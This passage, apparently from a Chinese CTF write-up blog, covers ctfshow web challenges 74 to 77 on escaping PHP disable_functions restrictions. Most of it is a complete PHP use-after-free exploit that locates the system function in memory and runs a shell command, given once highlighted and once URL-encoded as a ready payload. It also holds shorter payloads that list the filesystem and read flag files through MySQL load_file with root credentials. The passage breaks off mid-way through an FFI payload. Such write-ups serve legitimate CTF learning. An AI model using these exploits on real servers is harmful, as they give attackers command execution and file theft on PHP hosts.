class=\"token variable\">$abc_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc8</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$closure_obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_handlers</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't determine binary base address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$elf</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't parse ELF header\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get basic_functions address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$zif_system</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get zif_system address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x110</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_obj</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$fake_obj_offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$zif_system</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\n    <span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag0.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121909286.png\" alt=\"image-20221101121909286\" /></p>\n<h2 id=\"web75\"><a class=\"anchor\" href=\"#web75\">#</a> web75</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c=?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>看到 flag 在 flag36 里</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122250381.png\" alt=\"image-20221101122250381\" /></p>\n<p>又来。。但是 UAF 也不能用了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122350518.png\" alt=\"image-20221101122350518\" /></p>\n<p>用数据库去读取文件</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mysql:host=localhost;dbname=ctftraining'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbh</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select load_file(\"/flag36.txt\")'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PDOException</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101123147447.png\" alt=\"image-20221101123147447\" /></p>\n<h2 id=\"web77\"><a class=\"anchor\" href=\"#web77\">#</a> web77</h2>\n<p>上面的方法都 ban 了，使用 FFI</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token variable\">$ffi</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">FFI</span><span class=\"token operator\">::</span><span class=\"token function\">cdef</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"int system(const char 